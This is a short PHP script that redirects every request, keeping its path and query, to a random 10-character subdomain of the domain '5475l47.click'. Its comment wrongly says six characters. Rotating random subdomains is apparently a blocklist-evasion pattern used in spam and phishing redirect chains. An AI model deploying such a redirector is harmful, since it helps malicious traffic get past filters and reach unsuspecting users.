<?php

$domain = "5475l47.click";

function generateRandomString($length = 10) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}

// Generate a 6-character random subdomain
$randomSubdomain = generateRandomString(10);

// Retrieve the original request path and query string
$requestUri = $_SERVER['REQUEST_URI'];

// Construct the new URL
$newUrl = 'http://' . $randomSubdomain . '.' . $domain . $requestUri;

// Perform the redirection with a 302 Temporary Redirect
header("Location: $newUrl", true, 302);
exit();
?>
